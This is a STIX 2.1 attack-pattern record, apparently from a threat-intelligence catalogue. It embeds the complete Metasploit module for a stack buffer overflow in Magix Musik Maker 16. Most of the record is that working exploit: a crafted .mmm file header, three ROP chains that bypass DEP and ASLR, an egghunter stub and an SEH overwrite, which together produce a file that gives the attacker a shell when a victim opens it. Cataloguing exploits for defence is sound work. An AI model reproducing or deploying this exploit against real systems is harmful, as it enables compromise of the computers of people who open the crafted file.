{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ab1a7843-16ea-4fdb-9b59-1d41d2b46c72",
    "created": "2024-08-14T16:36:47.399334Z",
    "modified": "2024-08-14T16:36:47.399338Z",
    "name": "Magix Musik Maker 16 .mmm Stack Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Magix Musik Maker 16. When opening a specially crafted arrangement file (.mmm) in the application, an unsafe strcpy() will allow you to overwrite a SEH handler.  This exploit bypasses DEP & ASLR, and works on XP, Vista & Windows 7.  Egghunter is used, and might require up to several seconds to receive a shell.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/magix_musikmaker_16_mmm.rb",
            "external_id": "magix_musikmaker_16_mmm.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.corelan.be/advisories.php?id=CORELAN-11-002"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Remote::Egghunter\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Magix Musik Maker 16 .mmm Stack Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Magix Musik Maker 16.\n        When opening a specially crafted arrangement file (.mmm) in the application, an\n        unsafe strcpy() will allow you to overwrite a SEH handler.  This exploit\n        bypasses DEP & ASLR, and works on XP, Vista & Windows 7.  Egghunter is used, and\n        might require up to several seconds to receive a shell.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n      [\n        'acidgen',      #found the vulnerability\n        'corelanc0d3r <peter.ve[at]corelan.be>'  #rop exploit + msf module\n      ],\n      'References'     =>\n        [\n          [ 'OSVDB', '72063'],\n          [ 'URL', 'http://www.corelan.be/advisories.php?id=CORELAN-11-002' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'       => 8000,  #could be more, but this is enough\n          'DisableNops' =>  'True',\n          'BadChars'    => \"\\x00\\x0a\\x0d\",\n        },\n      'Platform' => 'win',\n      'Targets'        =>\n        [\n          [\n            'Windows Universal DEP & ASLR Bypass',\n            {\n              'OffSet' => 198,\n              'Ret'    => 0x200146fa,  #add esp,40c/ret [ltkrn14n.dll]\n            }\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2011-04-26',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ true, 'mmm file',  'msf.mmm']),\n      ])\n  end\n\n  def junk\n    return rand_text(4).unpack(\"L\")[0].to_i\n  end\n\n  def exploit\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n\n    badchars = \"\"\n    eggoptions =\n    {\n      :checksum  => false,\n      :eggtag    => \"Wo0t\",\n      :depmethod => \"copy\",\n      :depreg    => \"edi\",\n      :depdest   => \"ebp\"\n    }\n    hunter,egg = generate_egghunter(payload.encoded,badchars,eggoptions)\n\n    header = \"RIFF\"\n    header << \"\\x8c\"\n    header << \"A\"\n    header << \"\\x07\\x00\"\n    header << \"SEKDSVIP\"\n    header << \"\\x10\\x07\\x00\\x00\\x9b\"\n    header << \"[n\"\n    header << \"\\x00\" * 5\n    header << \"\\x11\"\n    header << \"\\x00\" * 3\n    header << \"\\x08\"\n    header << \"\\x00\" * 3\n    header << \"D\"\n    header << \"\\xac\\x00\\x00\\x11\"\n    header << \"\\x00\" * 9\n    header << \"9@\"\n    header << \"\\x00\\x00\\xf0\"\n    header << \"B\"\n    header << \"\\x00\" * 4\n    header << \"\\xbd\\x04\\xef\\xfe\\x00\\x00\\x01\"\n    header << \"\\x00\" * 3\n    header << \"\\x10\\x00\\x04\\x00\\x02\"\n    header << \"\\x00\" * 3\n    header << \"\\x10\\x00\\x04\\x00\\x02\\x00\"\n    header << \"?\"\n    header << \"\\x00\" * 3\n    header << \"(\"\n    header << \"\\x00\" * 3\n    header << \"\\x04\\x00\\x04\\x00\\x01\"\n    header << \"\\x00\" * 15\n    header << \"K\"\n    header << \"\\x91\"\n    header << \"2\"\n    header << \"\\x01\\xd0\\x02\\x00\\x00\"\n    header << \"@\"\n    header << \"\\x02\\x00\\x00\"\n    header << \"UUUUUU\"\n    header << \"\\xf5\"\n    header << \"?\"\n    header << \"\\x10\"\n    header << \"\\x00\" * 7\n    header << \"\\xff\" * 8\n    header << \"\\x00\" * 1680\n    header << \"LISTx\"\n    header << \"\\x95\\x02\\x00\"\n    header << \"physfile\"\n    header << \"\\xf8\\x08\\x00\\x00\"\n    header << \"C:\\\\Documents and Settings\\\\\"\n    header << rand_text(8)\n    header << \"\\\\My Documents\\\\MAGIX_Music_Maker_16\\\\AudioTemp\"\n    header << \"\\x00\" * 52\n    header << \"Fat Rocker I_ogg.HDP\"\n    header << \"\\x00\" * 110\n    header << \"C:\\\\Documents and Settings\\\\All Users\\\\Application Data\\\\MAGIX\\\\Music_Maker_16\\\\_Demos\\\\Demo\"\n    header << \"\\x00\" * 175\n    header << \"Fat Rocker I.OGG\"\n    header << \"\\x00\" * 678\n    header << \"\\xf0\\xbf\"\n    header << \"\\x00\" * 22\n    header << \"\\xf0\"\n    header << \"?\"\n    header << \"\\x00\" * 6\n    header << \"^@\"\n    header << \"\\x00\" * 6\n    header << \"^@\"\n    header << \"\\x00\" * 264\n\n    filename = \"C:\\\\temp\\\\\"\n    filename << \"\\xb3\\x10\\xf8\\x1f\" * 14  # slide\n    filename << \"\\x1e\\x92\\x01\\x20\"       # align\n\n    rop_chain1 =\n    [\n      #API pointer\n      0x2004e493,  # PUSH ESP # ADD EAX,20 # POP EBX # RETN  ** [LTKRN14N.dll]\n      0x1ff810b3,  # rop nop\n      0x1ff810b3,  # rop nop\n      0x1ff810b3,  # rop nop\n      0x20047f30,  # POP ECX # RETN  ** [LTKRN14N.dll]\n      0x2005012c,  # &API ptr\n      0x200263e4,  # MOV EAX,DWORD PTR DS:[ECX] # RETN  ** [LTKRN14N.dll]\n      0x1ffa3ab3,  # MOV DWORD PTR DS:[EBX],EAX # MOV EAX,1 # POP EBX # RETN 0C  ** [LTDIS14n.dll]\n      junk,\n      0x2004e493,  # PUSH ESP # ADD EAX,20 # POP EBX # RETN    ** [LTKRN14N.dll]\n      junk,\n      junk,\n      junk,\n      0x20035546,  # MOV EAX,EBX # POP EBP # POP EBX # RETN  ** [LTKRN14N.dll]\n      junk,\n      junk,\n      0x1ff95f45,  # PUSH EAX # POP ESI # RETN 08  ** [LTDIS14n.dll]\n      0x1ffa82ef,  # POP EAX # RETN\n      junk,\n      junk,\n      0x2E9FA63D,\n      0x2004cb15,  # ADD EAX,74085539 # ADD EAX,5D58046A # RETN  ** [LTKRN14N.dll] D16059A3\n      0x1ff93af7,  # ADD EAX,ESI # POP ESI # RETN  ** [LTDIS14n.dll]\n      junk,\n      0x20047f30,  # POP ECX # RETN  ** [LTKRN14N.dll]\n      0x2001283a,  # POP ESI # POP EBP # POP EBX # ADD ESP,1F4 # RETN 10  ** [LTKRN14N.dll]\n      # write\n      0x1ff9cf5a,  # MOV DWORD PTR DS:[EAX],ECX # MOV EAX,1 # POP ESI # RETN 08  ** [LTDIS14n.dll]\n      junk,\n      0x2004e493,  # PUSH ESP # ADD EAX,20 # POP EBX # RETN  ** [LTKRN14N.dll]\n      junk,\n      junk,\n      0x20035546,  # MOV EAX,EBX # POP EBP # POP EBX # RETN  ** [LTKRN14N.dll]\n      junk,\n      junk,\n      0x1ff95f45,  # PUSH EAX # POP ESI # RETN 08  ** [LTDIS14n.dll]\n      0x1ffa82ef,  # POP EAX # RETN\n      junk,\n      junk,\n      0x2E9FA5F9,\n      0x2004cb15,  # ADD EAX,74085539 # ADD EAX,5D58046A # RETN  ** [LTKRN14N.dll]\n      0x1ff93af7,  # ADD EAX,ESI # POP ESI # RETN  ** [LTDIS14n.dll]\n      junk,\n      0x2003e6cd,  # MOV DWORD PTR DS:[EAX],EDI # POP EDI # POP ESI # MOV EAX,1 # RETN 10  ** [LTKRN14N.dll]\n      junk,\n      junk,\n      0x1ffa82ef,  # POP EAX # RETN    ** [LTDIS14n.dll]\n      junk,\n    ].pack(\"V*\")\n\n\n    rop_chain2 = [\n      0x2004cb15,  # ADD EAX,74085539 # ADD EAX,5D58046A # RETN  ** [LTKRN14N.dll]\n      0x1ff7c4e5,  # XCHG EAX,EDI # RETN  ** [LTDIS14n.dll]\n      0x2004e493,  # PUSH ESP # ADD EAX,20 # POP EBX # RETN    ** [LTKRN14N.dll]\n      0x20035546,  # MOV EAX,EBX # POP EBP # POP EBX # RETN    ** [LTKRN14N.dll]\n      junk,\n      junk,\n      0x1ff95f45,  # PUSH EAX # POP ESI # RETN 08  ** [LTDIS14n.dll]\n      0x1ffa82ef,  # POP EAX # RETN\n      junk,\n      junk,\n      0x2E9FA591,\n      0x2004cb15,  # ADD EAX,74085539 # ADD EAX,5D58046A # RETN  ** [LTKRN14N.dll]  D16059A3\n      0x1ff93af7,  # ADD EAX,ESI # POP ESI # RETN  ** [LTDIS14n.dll]\n      junk,\n      0x2003e6cd,  # MOV DWORD PTR DS:[EAX],EDI # POP EDI # POP ESI # MOV EAX,1 #\n      junk,\n      junk,\n      0x1ffa82ef,  # POP EAX # RETN  ** [LTDIS14n.dll]\n      junk,\n      junk,\n      junk,\n      junk,\n      0x2E9FB65D,\n      0x2004cb15,  # ADD EAX,74085539 # ADD EAX,5D58046A # RETN  ** [LTKRN14N.dll]\n      0x1ff7c4e5,  # XCHG EAX,EDI # RETN  ** [LTDIS14n.dll]\n      0x2004e493,  # PUSH ESP # ADD EAX,20 # POP EBX # RETN    ** [LTKRN14N.dll]\n      0x20035546,  # MOV EAX,EBX # POP EBP # POP EBX # RETN    ** [LTKRN14N.dll]\n      junk,\n      junk,\n      0x1ff95f45,  # PUSH EAX # POP ESI # RETN 08  ** [LTDIS14n.dll]\n      0x1ffa82ef,  # POP EAX # RETN\n      junk,\n      junk,\n      0x2E9FA539,\n      0x2004cb15,  # ADD EAX,74085539 # ADD EAX,5D58046A # RETN    **D16059A3 [LTKRN14N.dll]\n      0x1ff93af7,  # ADD EAX,ESI # POP ESI # RETN  ** [LTDIS14n.dll]\n      junk,\n      0x2003e6cd,  # MOV DWORD PTR DS:[EAX],EDI # POP EDI # POP ESI # MOV EAX,1 # RETN 10\n      junk,\n      junk,\n      0x2004e494,  # ADD EAX,20 # POP EBX # RETN    ** [LTKRN14N.dll]\n      junk,\n      junk,\n      junk,\n      junk,\n      junk,\n      0x2004e494,  # ADD EAX,20 # POP EBX # RETN    ** [LTKRN14N.dll]\n      junk,\n      0x1ffa0231,  # DEC EAX # RETN    ** [LTDIS14n.dll]\n      0x1ff7c4e5,  # XCHG EAX,EDI # RETN    ** [LTDIS14n.dll]\n      0x2004e493,  # PUSH ESP # ADD EAX,20 # POP EBX # RETN    ** [LTKRN14N.dll]\n      0x20035546,  # MOV EAX,EBX # POP EBP # POP EBX # RETN    ** [LTKRN14N.dll]\n      junk,\n      junk,\n      0x1ff95f45,  # PUSH EAX # POP ESI # RETN 08  ** [LTDIS14n.dll]\n      0x1ffa82ef,  # POP EAX # RETN\n      junk,\n      junk,\n      0x2E9FA4D9,\n      0x2004cb15,  # ADD EAX,74085539 # ADD EAX,5D58046A # RETN  D16059A3\n      0x1ff93af7,  # ADD EAX,ESI # POP ESI # RETN    ** [LTDIS14n.dll]\n      junk,\n      0x2003e6cd,  # MOV DWORD PTR DS:[EAX],EDI # POP EDI # POP ESI # MOV EAX,1 # RETN 10  ** [LTKRN14N.dll]\n      junk,\n      junk,\n      0x2004e493,  # PUSH ESP # ADD EAX,20 # POP EBX # RETN  ** [LTKRN14N.dll]\n      junk,\n      junk,\n      junk,\n      junk,\n      0x20035546,  # MOV EAX,EBX # POP EBP # POP EBX # RETN  ** [LTKRN14N.dll]\n      junk,\n      junk,\n      0x1ff95f45,  # PUSH EAX # POP ESI # RETN 08  ** [LTDIS14n.dll]\n      0x1ffa82ef,  # POP EAX # RETN\n      junk,\n      junk,\n      0x2E9FA469,\n      0x2004cb15,  # ADD EAX,74085539 # ADD EAX,5D58046A # RETN    ** [LTKRN14N.dll]\n      0x1ff93af7,  # ADD EAX,ESI # POP ESI # RETN    ** [LTDIS14n.dll]\n      junk,\n      0x1ff72ce1,  # XCHG EAX,ESP # POP EDI # POP ESI # POP EBP # POP EBX # MOV EAX,1 # RETN\n      junk,\n    ].pack(\"V*\")\n\n    rop_chain3 = [\n      0x1ff95f45,  # PUSH EAX # POP ESI # RETN 08\n      junk,\n      junk,\n      junk,\n      junk,\n      0x1ffa82ef,  # POP EAX # RETN\n      junk,\n      junk,\n      0x2004FF98,\n      0x1ffaccf6,  # ADD EAX,100 # POP EBP # RETN\n      junk,\n      0x20026406,  # MOV EAX,DWORD PTR DS:[EAX] # NEG EAX # RETN  ** [LTKRN14N.dll]\n      0x20026408,  # NEG EAX # RETN         ** [LTKRN14N.dll]\n      0x1ff7c4e5,  # XCHG EAX,EDI # RETN    ** [LTDIS14n.dll]\n      0x2004da79,  # XOR EAX,EAX # RETN     ** [LTKRN14N.dll]\n      0x1ff93ae1,  # ADD EAX,ESI # POP ESI # RETN\n      junk,\n      0x1ff95f45,  # PUSH EAX # POP ESI # RETN 08  ** [LTDIS14n.dll]\n      0x1fffeb75,  # XCHG EAX,EBP # RETN           ** [LTKRN14N.dll]\n      junk,\n      junk,\n      #Oh Irony !\n      0x6001ac84,  # PUSHAD # RETN  ** [ijl10.dll]\n    ].pack(\"V*\")\n\n    rop_chain1_filler = rand_text(target['OffSet'] - rop_chain1.length - 2 )\n\n    # find a close heap\n    prehunter = \"\\x33\\xC0\"           #xor eax,eax\n    prehunter << \"\\x64\\x8B\\x40\\x30\"  #mov eax,fs[:30]\n    prehunter << \"\\x83\\xC0\\x48\"      #add eax,48\n    prehunter << \"\\x83\\xC0\\x48\"      #add eax,48\n    prehunter << \"\\x8B\\x10\"          #mov edx,[eax]\n    prehunter << \"\\x83\\xc2\\x4c\"      #add edx,4c\n    prehunter << \"\\x83\\xc2\\x4c\"      #add edx,4c\n    prehunter << \"\\x8B\\x12\"          #mov edx,[edx]\n\n    nops = make_nops(100)\n\n    filler = \"\\x5D\\xC6\\x9F\\x2E\"      # offset to 0x2000\n    filler << \"\\xc2\\x53\\x02\\x20\"     # RETN\n    filler << \"\\x04\\x80\\xfa\\x1f\"     # jump - first run : 0x1ffa8004 :  {pivot 8}  # POP EDI # POP EBP # RETN  ** [LTDIS14n.dll]\n    filler << \"\\x12\\x3a\\xff\\x1f\"     # p/p/p/p/add esp,90/ret [ltkrn14n.dll] - second run\n    filler << \"\\xff\\xff\\xff\\xff\"     # access violation\n\n    buffer = header\n    buffer << filename\n    buffer << rop_chain1\n    buffer << rop_chain1_filler\n    buffer << [target.ret].pack(\"V\")\n    buffer << filler\n    buffer << rop_chain2\n    buffer << rop_chain3\n    buffer << prehunter\n    buffer << hunter\n    buffer << nops\n    buffer << egg\n\n    filecontent = header + buffer\n\n    print_status(\"Writing payload to file\")\n\n    file_create(filecontent)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-04-26",
    "x_mitre_platforms": [
        "win'"
    ]
}